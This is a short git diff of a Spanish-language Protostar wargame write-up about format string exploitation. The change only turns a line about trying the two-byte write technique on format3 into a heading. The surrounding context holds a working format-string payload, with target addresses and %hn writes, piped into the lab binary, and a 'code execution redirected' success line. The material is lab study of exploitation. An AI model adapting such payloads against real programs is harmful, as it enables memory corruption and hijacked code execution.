@@ -399,7 +399,7 @@ $19 = 33616 -> Esto es para el segundo argumento (el primero se queda como antes
 code execution redirected! you win
 ```
 
-Probe a hacer la tecnica de los 2 bytes con el format 3 (tiene que salir 0x1025544)
+## Extra -> Probe a hacer la tecnica de los 2 bytes con el format 3 (tiene que salir 0x1025544)
 
 ```console
 [user@protostar]-[/opt/protostar/bin]:$ python -c 'print "\xf4\x96\x04\x08\xf6\x96\x04\x08" + "%12$hn%13$hn"' | ./format3 | tail -n1
